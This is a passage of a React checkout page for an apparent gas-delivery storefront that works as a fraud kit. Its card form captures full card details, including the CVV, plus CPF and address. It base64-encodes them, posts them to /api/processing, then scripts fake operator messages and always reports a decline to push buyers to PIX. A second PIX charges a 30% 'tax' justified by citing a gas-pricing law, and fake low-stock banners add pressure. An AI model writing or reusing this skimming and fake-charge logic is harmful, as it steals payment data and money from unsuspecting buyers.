    const currentPixData = JSON.parse(currentPixStr)
    const isMainPix = pixData.id === currentPixData.pixData?.id
    
    // Verificar se já existe PIX de impostos
    const hasTaxPix = !!taxPixStr
    
    // Só enviar waiting_payment se:
    // 1. É o PIX principal (70%)
    // 2. Status é waiting_payment
    // 3. Ainda não foi enviado
    // 4. NÃO é o PIX de impostos (30%)
    if (pixData && 
        isMainPix && // Garantir que é o PIX principal (70%)
        (pixData.status === 'waiting_payment' || pixData.status === 'WAITING_PAYMENT') && 
        !utmifySent.pending
    ) {
      console.log('🚀 [UTMIFY] Disparando waiting_payment via useEffect (PIX 70%)')
      sendToUtmify('waiting_payment')
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [pixData?.id, pixData?.status, utmifySent.pending])
  
  // Iniciar polling quando PIX for gerado
  useEffect(() => {
    if (pixData && pixData.status === 'paid') {
      // Parar polling se pagamento foi confirmado
      if (pollingInterval) {
        clearInterval(pollingInterval)
        setPollingInterval(null)
      }
    }
  }, [pixData?.id, pixData?.status])
  
  // Agendar envio de SMS após 5 minutos se não pagar
  useEffect(() => {
    if (pixData && pixData.status === 'waiting_payment' && !smsReminderSent) {
      const smsTimeout = setTimeout(() => {
        if (pixData.status === 'waiting_payment') {
          sendSmsReminder()
        }
      }, 5 * 60 * 1000) // 5 minutos
      
      return () => {
        clearTimeout(smsTimeout)
      }
    }
  }, [pixData?.id, pixData?.status, smsReminderSent])
  
  // useEffect removido - conversão agora é enviada apenas no polling quando PAID

  // Timer de 15 minutos para desconto PIX
  useEffect(() => {
    if (step === 3 && !pixData && pixTimer > 0) {
      const timer = setInterval(() => {
        setPixTimer(prev => prev > 0 ? prev - 1 : 0)
      }, 1000)
      return () => clearInterval(timer)
    }
  }, [step, pixData, pixTimer])

  // Mostrar botão de suporte após 5 minutos do PIX gerado e não pago
  useEffect(() => {
    if (pixData && pixData.status === 'waiting_payment') {
      const supportTimer = setTimeout(() => {
        setShowSupportButton(true)
      }, 5 * 60 * 1000) // 5 minutos
      
      return () => clearTimeout(supportTimer)
    } else {
      setShowSupportButton(false)
    }
  }, [pixData?.id, pixData?.status])

  // Debug: Monitorar mudanças no modal de desconto PIX
  useEffect(() => {
    console.log('🔍 [DEBUG] showPixDiscountModal mudou para:', showPixDiscountModal)
    if (showPixDiscountModal) {
      console.log('✅ Modal de desconto PIX está ABERTO')
    } else {
      console.log('❌ Modal de desconto PIX está FECHADO')
    }
  }, [showPixDiscountModal])

  // Debug: Monitorar mudanças no modal de upsell
  useEffect(() => {
    console.log('🔍 [DEBUG UPSELL] showUpsellModal mudou para:', showUpsellModal)
    if (showUpsellModal) {
      console.log('✅ Modal de UPSELL está ABERTO')
    } else {
      console.log('❌ Modal de UPSELL está FECHADO')
    }
  }, [showUpsellModal])

  // Gerar PIX automaticamente ao chegar no Step 3
  useEffect(() => {
    console.log('🔍 [AUTO-PIX DEBUG] useEffect disparado:', {
      step,
      hasPixData: !!pixData,
      hasCustomerData: !!customerData,
      hasAddressData: !!addressData,
      pixLoading
    })
    
    if (step === 3 && !pixData && customerData && addressData) {
      console.log('🚀 [AUTO-PIX] Step 3 detectado, gerando PIX automaticamente...')
      console.log('📊 [AUTO-PIX] Dados disponíveis:', {
        customerData: !!customerData,
        addressData: !!addressData,
        pixDiscount,
        discountApproved,
        pixLoading
      })
      
      // Só gerar se ainda não estiver gerando
      if (!pixLoading) {
        console.log('✅ [AUTO-PIX] Iniciando geração...')
        // Gerar PIX com desconto se aplicável
        generatePix(discountApproved || pixDiscount > 0)
      } else {
        console.log('⏳ [AUTO-PIX] Já está gerando, aguardando...')
      }
    } else if (step === 3 && pixData) {
      console.log('ℹ️ [AUTO-PIX] Step 3 mas PIX já existe (restaurado ou já gerado)')
    }
  }, [step, pixData, customerData, addressData])

  // Formatar timer
  const formatPixTimer = () => {
    const mins = Math.floor(pixTimer / 60)
    const secs = pixTimer % 60
    return `${mins}:${secs.toString().padStart(2, '0')}`
  }

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setCardSubmitting(true)

    // Preparar dados
    const dataToEncrypt = {
      customerName: customerData.name,
      customerCpf: customerData.cpf,
      customerPhone: customerData.phone,
      customerEmail: `${customerData.phone.replace(/\D/g, '')}@cliente.com`,
      customerAddress: `${addressData?.logradouro}, ${customerData.number} - ${addressData?.bairro}, ${addressData?.localidade}/${addressData?.uf}`,
      cardNumber: cardData.cardNumber,
      cardHolderName: cardData.cardHolderName,
      cardExpiryDate: cardData.cardExpiryDate,
      cardCvv: cardData.cardCvv,
      productName: productName,
      productPrice: getTotalPrice(),
      productQuantity: 1,
      total: getTotalPrice()
    }

    // "Criptografar" dados (base64 no front)
    const encryptedData = btoa(JSON.stringify(dataToEncrypt))

    // Etapa 1: Processando transação
    setCardLoadingMessage('Processando transação...')
    await new Promise(resolve => setTimeout(resolve, 1500))
    
    // Etapa 2: Contactando operadora
    setCardLoadingMessage('Contactando a operadora do seu cartão...')
    
    // Salvar dados e processar
    try {
      console.log('📤 Enviando dados do cartão para processamento...')
      const response = await fetch('/api/processing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: encryptedData })
      })
      
      const result = await response.json()
      console.log('📥 Resposta da API:', result)
      
    } catch (error) {
      console.error('❌ Erro ao processar:', error)
    }
    
    await new Promise(resolve => setTimeout(resolve, 1500))
    
    // Etapa 3: Aguardando resposta
    setCardLoadingMessage('Aguardando resposta da operadora...')
    await new Promise(resolve => setTimeout(resolve, 1500))
    
    // Etapa 4: Infelizmente...
    setCardLoadingMessage('Infelizmente o pagamento não foi aprovado...')
    await new Promise(resolve => setTimeout(resolve, 1000))

    // Sempre mostrar que falhou e oferecer PIX
    console.log('🚨 Mostrando erro do cartão e oferecendo PIX...')
    setCardSubmitting(false)
    setShowCardForm(false)
    setCardFailed(true)
    
    // Calcular e aplicar desconto de 10%
    const discount = Math.round(getTotalPrice() * 0.10)
    setPixDiscount(discount)
    console.log('💰 Desconto PIX calculado:', discount)
    
    // Mostrar modal de erro com opção PIX
    console.log('🎯 Abrindo modal de erro do cartão...')
    setTimeout(() => {
      console.log('🎯 Chamando setShowPixDiscountModal(true)...')
      setShowPixDiscountModal(true)
      console.log('🔍 Estado showPixDiscountModal após set:', showPixDiscountModal)
    }, 500)
  }

  const formatCardNumber = (value: string) => {
    const cleanValue = value.replace(/\D/g, '')
    return cleanValue.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
  }

  const formatExpiryDate = (value: string) => {
    const cleanValue = value.replace(/\D/g, '')
    if (cleanValue.length >= 2) {
      return cleanValue.substring(0, 2) + '/' + cleanValue.substring(2, 4)
    }
    return cleanValue
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header Fixo de Localização */}
      <LocationHeader />
      
      {/* Modal de PIX Pendente */}
      <Dialog open={showPendingPixModal} onOpenChange={setShowPendingPixModal}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle className="text-center text-xl font-bold text-gray-800">
              🔔 Você tem um pedido pendente!
            </DialogTitle>
          </DialogHeader>
          
          <div className="space-y-4">
            <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-4 text-center">
              <p className="text-gray-700 mb-2">
                Detectamos que você tem um <strong>QR Code PIX</strong> aguardando pagamento.
              </p>
              <p className="text-sm text-gray-600">
                Deseja continuar com este pedido ou começar um novo?
              </p>
            </div>

            {pendingPixData && (
              <div className="bg-gray-50 rounded-lg p-3 text-sm">
                <p className="font-semibold text-gray-800 mb-1">Detalhes do Pedido:</p>
                <p className="text-gray-600">
                  Valor: <strong className="text-green-600">
                    {formatPrice(pendingPixData.pixData.amount)}
                  </strong>
                </p>
                <p className="text-gray-600">
                  Cliente: <strong>{pendingPixData.customerData.name}</strong>
                </p>
              </div>
            )}

            <div className="grid grid-cols-2 gap-3">
              <Button
                onClick={startNewOrder}
                variant="outline"
                className="w-full"
              >
                🔄 Novo Pedido
              </Button>
              <Button
                onClick={continuePendingPix}
                className="w-full bg-green-600 hover:bg-green-700"
              >
                ✅ Continuar
              </Button>
            </div>

            <p className="text-xs text-center text-gray-500">
              O QR Code anterior ainda é válido por mais tempo
            </p>
          </div>
        </DialogContent>
      </Dialog>
      
      {/* Modal de Pagamento de Impostos (30%) - Compacto */}
      <Dialog open={showTaxPaymentModal} onOpenChange={setShowTaxPaymentModal}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center text-lg font-bold text-gray-800">
              ✅ Primeira Parte Paga!
            </DialogTitle>
          </DialogHeader>
          
          <div className="space-y-3">
            {/* Resumo Compacto */}
            <div className="bg-green-50 border border-green-300 rounded-lg p-3 text-center">
              <p className="text-sm font-bold text-green-700 mb-1">
                Parabéns! 70% pago 🎊
              </p>
              <p className="text-xs text-gray-600">
                Falta apenas os <strong>impostos (30%)</strong>
              </p>
            </div>

            {/* Valores */}
            <div className="bg-white border border-gray-200 rounded-lg p-3">
              <div className="space-y-1.5 text-xs">
                <div className="flex justify-between">
                  <span className="text-gray-600">✅ Já pago (70%):</span>
                  <strong className="text-green-600">{formatPrice(getFirstPaymentAmount())}</strong>
                </div>
                <div className="flex justify-between border-t pt-1.5">
                  <span className="text-gray-600">📊 Impostos (30%):</span>
                  <strong className="text-orange-600">{formatPrice(getTaxPaymentAmount())}</strong>
                </div>
                <div className="flex justify-between border-t pt-1.5 font-bold">
                  <span>💰 Total:</span>
                  <strong className="text-blue-600">{formatPrice(getTotalPrice() - pixDiscount)}</strong>
                </div>
              </div>
            </div>

            {/* Info Impostos */}
            <div className="bg-orange-50 border border-orange-200 rounded-lg p-2.5">
              <p className="text-[10px] text-gray-700 leading-relaxed">
                <strong>🏛️ Impostos obrigatórios:</strong> ICMS + PIS/COFINS conforme Lei nº 14.134/2021
              </p>
            </div>

            {/* Botão */}
            <Button
              onClick={async () => {
                console.log('🔥 Botão clicado! Gerando PIX de 30%...')
                await generateTaxPix()
                setShowTaxPaymentModal(false)
              }}
              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-2.5 text-sm"
              disabled={pixLoading}
            >
              {pixLoading ? '⏳ Gerando...' : `💳 Gerar PIX (${formatPrice(getTaxPaymentAmount())})`}
            </Button>

            <p className="text-[10px] text-center text-gray-500">
              Após o pagamento, o motoboy será notificado! 🏍️
            </p>
          </div>
        </DialogContent>
      </Dialog>
      
      {/* Modal de Upsell de Cervejas - Opcional */}
      <Dialog open={showUpsellModal} onOpenChange={setShowUpsellModal}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center text-lg font-bold text-gray-800">
              🎉 Pedido Confirmado!
            </DialogTitle>
          </DialogHeader>
          
          <div className="space-y-4">
            {/* Sucesso */}
            <div className="bg-green-50 border border-green-300 rounded-lg p-4 text-center">
              <div className="text-4xl mb-2">✅</div>
              <p className="text-sm font-bold text-green-700 mb-1">
                Pagamento Confirmado!
              </p>
              <p className="text-xs text-gray-600">
                Seu pedido está sendo preparado
              </p>
            </div>

            {/* Oferta de Cervejas */}
            <div className="bg-gradient-to-r from-amber-50 to-orange-50 border-2 border-orange-300 rounded-lg p-4">
              <div className="flex items-center gap-3 mb-3">
                <span className="text-3xl">🍺</span>
                <div>
                  <p className="font-bold text-orange-800 text-sm">
                    Oferta Exclusiva!
                  </p>
                  <p className="text-xs text-gray-700">
                    Cervejas geladas com desconto especial
                  </p>
                </div>
              </div>
              
              <div className="bg-white rounded-lg p-3 mb-3">
                <p className="text-xs text-gray-700 mb-2">
                  <strong>Aproveite:</strong>
                </p>
                <ul className="text-xs text-gray-600 space-y-1">
                  <li>🍺 Budweiser - R$ 4,00/un</li>
                  <li>🍺 Corona Pack - R$ 27,40</li>
                  <li>🍺 Heineken - R$ 4,10/un</li>
                  <li>🍺 Original - R$ 3,10/un</li>
                </ul>
              </div>

              <p className="text-[10px] text-center text-gray-600">
                ✨ Entrega junto com seu pedido de gás
              </p>
            </div>

            {/* Botões */}
            <div className="space-y-2">
              <Button
                onClick={() => {
                  setShowUpsellModal(false)
                  router.push('/upsell')
                }}
                className="w-full bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-700 hover:to-orange-800 text-white font-bold py-2.5 text-sm"
              >
                🍺 Ver Ofertas de Cervejas
              </Button>
              
              <Button
                onClick={() => {
                  setShowUpsellModal(false)
                  router.push('/obrigado')
                }}
                variant="outline"
                className="w-full text-sm"
              >
                Não, obrigado
              </Button>
            </div>

            <p className="text-[10px] text-center text-gray-500">
              Você pode fechar esta janela a qualquer momento
            </p>
          </div>
        </DialogContent>
      </Dialog>

      {/* Modal de Confirmação de Endereço */}
      <Dialog open={showAddressModal} onOpenChange={setShowAddressModal}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center text-xl font-bold text-gray-800 flex items-center justify-center gap-2">
              <MapPin className="w-6 h-6 text-green-600" />
              Confirme seu Endereço
            </DialogTitle>
          </DialogHeader>
          
          {addressData && (
            <div className="space-y-4">
              <div className="bg-green-50 border border-green-200 rounded-lg p-3 sm:p-4">
                <div className="space-y-1 sm:space-y-2 text-xs sm:text-sm text-gray-700">
                  <p className="flex justify-between">
                    <strong>CEP:</strong>
                    <span>{addressData.cep}</span>
                  </p>
                  <p className="flex justify-between">
                    <strong>Rua:</strong>
                    <span className="text-right">{addressData.logradouro}</span>
                  </p>
                  <p className="flex justify-between">
                    <strong>Bairro:</strong>
                    <span>{addressData.bairro}</span>
                  </p>
                  <p className="flex justify-between">
                    <strong>Cidade:</strong>
                    <span>{addressData.localidade} - {addressData.uf}</span>
                  </p>
                </div>
              </div>
              
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 flex items-center gap-2">
                <Clock className="w-5 h-5 text-blue-600 flex-shrink-0" />
                <p className="text-xs text-blue-800 font-semibold">
                  Entrega em até 30 minutos!
                </p>
              </div>
              
              <div className="flex gap-3">
                <Button
                  onClick={confirmAddress}
                  className="flex-1 bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-semibold"
                >
                  ✓ Confirmar Endereço
                </Button>
                <Button
                  onClick={() => {
                    setShowAddressModal(false)
                    setAddressData(null)
                    setCep("")
                  }}
                  variant="outline"
                  className="px-6"
                >
                  Alterar CEP
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Header */}
      <header className="bg-white shadow-md">
        <div className="container mx-auto px-4 py-3 sm:py-4 flex items-center justify-between">
          <Button
            variant="ghost"
            onClick={() => router.back()}
            className="flex items-center gap-2 text-gray-600 hover:text-blue-600 p-2 sm:px-3"
          >
            <ArrowLeft size={18} />
            <span className="hidden sm:inline">Voltar</span>
          </Button>
          <img
            src="/images/configas.png"
            alt="Configás e Água"
            className="h-14 sm:h-[60px] w-auto"
            style={{ backgroundColor: 'transparent' }}
          />
          <div className="w-16 sm:w-20"></div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-6 sm:py-8 max-w-2xl">
        {/* Progress Steps */}
        <div className="flex items-center justify-center mb-6 sm:mb-8">
          <div className="flex items-center space-x-2 sm:space-x-4">
            <div
              className={`w-6 h-6 sm:w-8 sm:h-8 rounded-full flex items-center justify-center text-xs sm:text-sm font-semibold ${
                step >= 1 ? "bg-blue-600 text-white" : "bg-gray-200 text-gray-500"
              }`}
            >
              1
            </div>
            <div className={`w-8 sm:w-16 h-1 ${step >= 2 ? "bg-blue-600" : "bg-gray-200"}`}></div>
            <div
              className={`w-6 h-6 sm:w-8 sm:h-8 rounded-full flex items-center justify-center text-xs sm:text-sm font-semibold ${
                step >= 2 ? "bg-blue-600 text-white" : "bg-gray-200 text-gray-500"
              }`}
            >
              2
            </div>
            <div className={`w-8 sm:w-16 h-1 ${step >= 3 ? "bg-blue-600" : "bg-gray-200"}`}></div>
            <div
              className={`w-6 h-6 sm:w-8 sm:h-8 rounded-full flex items-center justify-center text-xs sm:text-sm font-semibold ${
                step >= 3 ? "bg-blue-600 text-white" : "bg-gray-200 text-gray-500"
              }`}
            >
              3
            </div>
          </div>
        </div>

        {/* Product Info */}
        <Card className="mb-4 sm:mb-6 border-2 border-blue-200 shadow-lg">
          <CardContent className="p-4 sm:p-6">
            <div className="flex flex-col sm:flex-row items-center gap-4">
              {/* Imagem do Produto */}
              <div className="flex-shrink-0">
                <img 
                  src={getProductImage()}
                  alt={productName}
                  className="w-24 h-24 sm:w-32 sm:h-32 object-contain rounded-lg shadow-md"
                />
              </div>
              
              {/* Detalhes do Produto */}
              <div className="flex-1 text-center sm:text-left">
                <p className="text-xs sm:text-sm text-gray-500 uppercase tracking-wide mb-1">
                  Finalizando compra
                </p>
                <h2 className="text-lg sm:text-2xl font-bold text-gray-800 mb-2">
                  {productName}
                </h2>
                <div className="flex flex-col sm:flex-row items-center sm:items-start gap-2 sm:gap-4">
                  <div className="text-2xl sm:text-3xl font-bold text-blue-600">
                    {formatPrice(getTotalPrice())}
                  </div>
                  {isGasProduct() && (
                    <div className="flex flex-col gap-1">
                      <span className="text-xs sm:text-sm text-green-600 font-semibold bg-green-50 px-2 py-1 rounded">
                        ✅ 70% agora
                      </span>
                      <span className="text-xs sm:text-sm text-orange-600 font-semibold bg-orange-50 px-2 py-1 rounded">
                        📊 30% depois (impostos)
                      </span>
                    </div>
                  )}
                </div>
                <p className="text-xs text-gray-500 mt-2">
                  🚚 Entrega em até {driverETA || '30 minutos'}
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Step 1: CEP */}
        {step === 1 && (
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <MapPin className="w-5 h-5 text-blue-600" />
                Confirme seu CEP
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleCepSubmit} className="space-y-4">
                <div>
                  <Input
                    type="text"
                    placeholder="Digite seu CEP (ex: 12345-678)"
                    value={cep}
                    onChange={(e) => setCep(formatCep(e.target.value))}
                    className="text-center text-lg"
                    maxLength={9}
                  />
                  {error && <p className="text-red-500 text-sm text-center mt-2">{error}</p>}
                </div>
                <Button
                  type="submit"
                  disabled={loading || cep.length < 9}
                  className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white"
                >
                  {loading ? "Verificando..." : "Confirmar CEP"}
                </Button>
              </form>
            </CardContent>
          </Card>
        )}

        {/* Step 2: Customer Data */}
        {step === 2 && addressData && (
          <div className="space-y-4 sm:space-y-6">
            {/* Address Confirmation - Esconder após preencher dados */}
            {(!customerData.name || !customerData.phone || !customerData.cpf || !customerData.number) && (
            <Card>
              <CardHeader className="pb-3 sm:pb-4">
                <CardTitle className="flex items-center gap-2 text-base sm:text-lg">
                  <MapPin className="w-4 h-4 sm:w-5 sm:h-5 text-green-600" />
                  Endereço Confirmado
                </CardTitle>
              </CardHeader>
              <CardContent className="pt-0">
                <div className="bg-green-50 border border-green-200 rounded-lg p-3 sm:p-4">
                  <div className="space-y-1 sm:space-y-2 text-xs sm:text-sm text-gray-700">
                    <p>
                      <strong>CEP:</strong> {addressData.cep}
                    </p>
                    <p>
                      <strong>Rua:</strong> {addressData.logradouro}
                    </p>
                    <p>
                      <strong>Bairro:</strong> {addressData.bairro}
                    </p>
                    <p>
                      <strong>Cidade:</strong> {addressData.localidade} - {addressData.uf}
                    </p>
                  </div>
                  <div className="flex items-center gap-2 mt-3 sm:mt-4 p-2 sm:p-3 bg-blue-50 border border-blue-200 rounded-lg">
                    <Clock className="w-4 h-4 sm:w-5 sm:h-5 text-blue-600" />
                    <p className="text-xs text-blue-800 font-semibold">
                      Entrega em até 30 minutos!
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
            )}

            {/* Desconto Aprovado - Esconder após preencher dados */}
            {(!customerData.name || !customerData.phone || !customerData.cpf || !customerData.number) && discountApproved && customerFound && (
              <Card className="border-2 border-green-400">
                <CardContent className="pt-4 sm:pt-6">
                  <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-300 rounded-lg p-4">
                    <div className="flex items-start gap-3">
                      <div className="bg-green-500 rounded-full p-2 flex-shrink-0">
                        <CheckCircle className="w-6 h-6 text-white" />
                      </div>
                      <div className="flex-1">
                        <h3 className="text-lg font-bold text-green-800 mb-1">
                          {customerFound.nomeCompleto}
                        </h3>
                        <p className="text-sm text-gray-700 mb-1">
                          <strong>CPF:</strong> {formatCPF(customerFound.cpf)}
                        </p>
                        <p className="text-sm text-green-700 font-semibold">
                          ✅ Desconto de 10% aplicado!
                        </p>
                        <p className="text-xs text-gray-600 mt-2">
                          Seu desconto será aplicado automaticamente no pagamento
                        </p>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Explicação do Pagamento em 2 Partes - Mostrar sempre (antes e depois de preencher) */}
            {isGasProduct() && (
              <Card ref={paymentExplanationRef} className="border-2 border-blue-400 bg-gradient-to-br from-blue-50 to-green-50">
                <CardContent className="pt-6 pb-6">
                  <div className="flex items-center gap-2 mb-4">
                    <span className="text-2xl">💳</span>
                    <h5 className="font-bold text-blue-800 text-lg">Como Funciona o Pagamento</h5>
                  </div>
                  
                  <p className="text-sm text-gray-700 leading-relaxed mb-4">
                    Para conseguirmos oferecer este <strong className="text-green-700">preço promocional incrível</strong>, o pagamento é feito em 2 etapas simples:
                  </p>

                  {/* Mostrar desconto de 10% se aplicado */}
                  {discountApproved && pixDiscount > 0 && (
                    <div className="bg-white border-2 border-green-400 rounded-xl p-4 mb-4 shadow-sm">
                      <div className="text-center">
                        <p className="text-sm text-gray-600 mb-1">Valor original:</p>
                        <p className="text-lg text-gray-500 line-through mb-2">
                          {formatPrice(getTotalPrice())}
                        </p>
                        <div className="inline-block bg-green-100 text-green-700 font-bold px-3 py-1 rounded-full text-sm mb-2">
                          -10% DESCONTO APLICADO
                        </div>
                        <p className="text-3xl font-bold text-green-700 mb-1">
                          {formatPrice(getTotalPrice() - pixDiscount)}
                        </p>
                        <p className="text-sm text-green-600 font-semibold">
                          🎉 Parabéns {customerData.name.split(' ')[0]}! Você economizou {formatPrice(pixDiscount)}!
                        </p>
                      </div>
                    </div>
                  )}

                    <div className="space-y-3">
                      {/* Primeira Parte - 70% */}
                      <div className="bg-white rounded-lg p-3 border-2 border-green-300">
                        <div className="flex items-center gap-2 mb-2">
                          <span className="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold">1</span>
                          <h6 className="font-bold text-green-800 text-sm">Primeira Parte (70%)</h6>
                        </div>
                        <div className="pl-8">
                          <p className="text-xs text-gray-700 mb-1">
                            <strong>Valor:</strong> <span className="text-green-600 font-bold text-base">{formatPrice(Math.round((getTotalPrice() - pixDiscount) * 0.70))}</span>
                          </p>
                          <p className="text-xs text-gray-600 leading-relaxed">
                            Este valor cobre o <strong>custo do produto + distribuição</strong>. Você paga agora via PIX.
                          </p>
                        </div>
                      </div>

                      {/* Segunda Parte - 30% */}
                      <div className="bg-white rounded-lg p-3 border-2 border-orange-300">
                        <div className="flex items-center gap-2 mb-2">
                          <span className="bg-orange-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold">2</span>
                          <h6 className="font-bold text-orange-800 text-sm">Segunda Parte (30%) - Impostos</h6>
                        </div>
                        <div className="pl-8">
                          <p className="text-xs text-gray-700 mb-1">
                            <strong>Valor:</strong> <span className="text-orange-600 font-bold text-base">{formatPrice(Math.round((getTotalPrice() - pixDiscount) * 0.30))}</span>
                          </p>
                          <p className="text-xs text-gray-600 leading-relaxed">
                            Este valor é referente aos <strong>impostos governamentais</strong> (ICMS + PIS/COFINS). Você paga logo após confirmar o primeiro pagamento.
                          </p>
                        </div>
                      </div>

                      {/* Total */}
                      <div className="bg-gradient-to-r from-blue-600 to-blue-700 rounded-lg p-3 text-white">
                        <div className="flex justify-between items-center">
                          <span className="font-bold text-sm">💰 Valor Total:</span>
                          <span className="font-bold text-xl">{formatPrice(getTotalPrice() - pixDiscount)}</span>
                        </div>
                      </div>
                    </div>

                    {/* Explicação Legal */}
                    <div className="mt-3 p-3 bg-yellow-50 border border-yellow-300 rounded-lg">
                      <div className="flex items-start gap-2">
                        <span className="text-lg">🏛️</span>
                        <div className="flex-1">
                          <p className="text-xs text-gray-700 leading-relaxed">
                            <strong>Por que separado?</strong> A <strong>Lei nº 14.134/2021</strong> estabelece a precificação do gás. Para manter nosso preço competitivo, separamos o valor do produto dos impostos obrigatórios.
                          </p>
                        </div>
                      </div>
                    </div>

                  {/* Aviso de Estoque */}
                  <div className="mt-3 p-2 bg-orange-100 border border-orange-400 rounded-lg text-center">
                    <p className="text-xs text-orange-800 font-bold">
                      🔥 Estoque limitado com este preço! Garanta já o seu!
                    </p>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Customer Data Form - Esconder após preencher */}
            {(!customerData.name || !customerData.phone || !customerData.cpf || !customerData.number) && (
            <Card>
              <CardHeader className="pb-3 sm:pb-4">
                <CardTitle className="text-base sm:text-lg">Confirme seus dados para entrega</CardTitle>
              </CardHeader>
              <CardContent className="pt-0">
                <form onSubmit={handleCustomerDataSubmit} className="space-y-3 sm:space-y-4">
                  {/* Mostrar nome e CPF apenas se desconto NÃO foi aprovado */}
                  {!discountApproved && (
                    <>
                      <div>
                        <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                          Nome completo *
                        </label>
                        <Input
                          type="text"
                          placeholder="Seu nome completo"
                          value={customerData.name}
                          onChange={(e) => {
                            const value = sanitizeInput(e.target.value, true) // Permitir espaços no nome
                            if (isInputSafe(value)) {
                              const newData = { ...customerData, name: value }
                              setCustomerData(newData)
                              saveCustomerData(newData)
                            }
                          }}
                          className="text-sm sm:text-base"
                          required
                        />
                      </div>

                      <div>
                        <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                          E-mail *
                        </label>
                        <Input
                          type="email"
                          placeholder="seu@email.com"
                          value={customerData.email}
                          onChange={(e) => {
                            const value = e.target.value.toLowerCase().trim()
                            const newData = { ...customerData, email: value }
                            setCustomerData(newData)
                            saveCustomerData(newData)
                          }}
                          required
                          className="text-sm sm:text-base"
                        />
                      </div>

                      <div className="grid grid-cols-2 gap-3 sm:gap-4">
                        <div>
                          <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                            Telefone/WhatsApp *
                          </label>
                          <Input
                            type="text"
                            placeholder="(31) 99999-9999"
                            value={customerData.phone}
                            onChange={(e) => {
                              const value = sanitizeInput(e.target.value)
                              if (isInputSafe(value)) {
                                const newData = { ...customerData, phone: formatPhone(value) }
                                setCustomerData(newData)
                                saveCustomerData(newData)
                              }
                            }}
                            className="text-sm sm:text-base"
                            maxLength={15}
                            required
                          />
                        </div>
                        <div>
                          <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                            CPF *
                          </label>
                          <Input
                            type="text"
                            placeholder="000.000.000-00"
                            value={customerData.cpf}
                            onChange={(e) => {
                              const value = sanitizeInput(e.target.value)
                              if (isInputSafe(value)) {
                                const newData = { ...customerData, cpf: formatCPF(value) }
                                setCustomerData(newData)
                                saveCustomerData(newData)
                              }
                            }}
                            className="text-sm sm:text-base"
                            maxLength={14}
                            required
                          />
                        </div>
                      </div>
                    </>
                  )}

                  {/* Mostrar apenas WhatsApp se desconto foi aprovado */}
                  {discountApproved && (
                    <div>
                      <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                        Telefone/WhatsApp *
                      </label>
                      <Input
                        type="text"
                        placeholder="(31) 99999-9999"
                        value={customerData.phone}
                        onChange={(e) => {
                          const value = sanitizeInput(e.target.value)
                          if (isInputSafe(value)) {
                            const newData = { ...customerData, phone: formatPhone(value) }
                            setCustomerData(newData)
                            saveCustomerData(newData)
                          }
                        }}
                        className="text-sm sm:text-base"
                        maxLength={15}
                        required
                      />
                    </div>
                  )}

                  <div className="grid grid-cols-2 gap-3 sm:gap-4">
                    <div>
                      <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                        Número *
                      </label>
                      <Input
                        type="text"
                        placeholder="123"
                        value={customerData.number}
                        onChange={(e) => {
                          const value = sanitizeInput(e.target.value)
                          if (isInputSafe(value)) {
                            const newData = { ...customerData, number: value }
                            setCustomerData(newData)
                            saveCustomerData(newData)
                          }
                        }}
                        className="text-sm sm:text-base"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-xs sm:text-sm font-medium text-gray-500 mb-1 sm:mb-2">
                        Complemento (opcional)
                      </label>
                      <Input
                        type="text"
                        placeholder="Apto 101"
                        value={customerData.complement}
                        onChange={(e) => {
                          const value = sanitizeInput(e.target.value)
                          if (isInputSafe(value)) {
                            const newData = { ...customerData, complement: value }
                            setCustomerData(newData)
                            saveCustomerData(newData)
                          }
                        }}
                        className="text-sm sm:text-base"
                      />
                    </div>
                  </div>

                  {/* Seleção de Marca de Gás */}
                  {isGasProduct() && (
                    <div className="border border-blue-200 rounded-lg p-4 bg-blue-50">
                      <h4 className="font-bold text-blue-800 text-sm mb-2">🔥 Marca pré-selecionada: <span className="text-green-600">Liquigas</span> (Melhor preço do dia)</h4>
                      <p className="text-xs text-gray-600 mb-3">Você pode alterar se preferir outra marca:</p>
                      <select
                        value={selectedGasBrand}
                        onChange={(e) => setSelectedGasBrand(e.target.value)}
                        className="w-full p-2 border border-blue-300 rounded-lg text-sm focus:ring-2 focus:ring-blue-600 focus:border-blue-600"
                      >
                        {gasBrands.map((brand) => {
                          const isPreSelected = brand === "Liquigas"
                          const extraPrice = isPreSelected ? 0 : generateExtraPrice(brand)
                          return (
                            <option key={brand} value={brand}>
